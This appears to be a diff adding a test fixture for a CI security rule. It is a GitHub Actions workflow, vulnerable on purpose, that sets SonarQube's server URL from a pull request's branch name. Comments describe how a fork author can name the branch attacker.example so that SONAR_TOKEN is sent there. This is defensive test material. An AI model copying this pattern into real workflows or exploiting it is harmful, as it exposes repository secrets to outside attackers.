@@ -1,0 +1,19 @@
+# situation: on pull_request_target, a step runs SonarSource's scanner with
+#   SONAR_TOKEN, and sets SONAR_HOST_URL in its env from the name of the pull
+#   request's head branch.
+# reason: a todo (the same file): the scanner sends SONAR_TOKEN to the server
+#   SONAR_HOST_URL names, and the author of the pull request names the branch.
+# cause: the rule reads the inputs of the table, not the env of the step.
+# attack: the author of a pull request from a fork names the branch
+#   attacker.example.
+# attack-run-behavior: the scanner sends its requests with SONAR_TOKEN to
+#   https://attacker.example.
+on: pull_request_target
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: SonarSource/sonarqube-scan-action@v4
+        env:
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+          SONAR_HOST_URL: https://${{ github.event.pull_request.head.ref }}
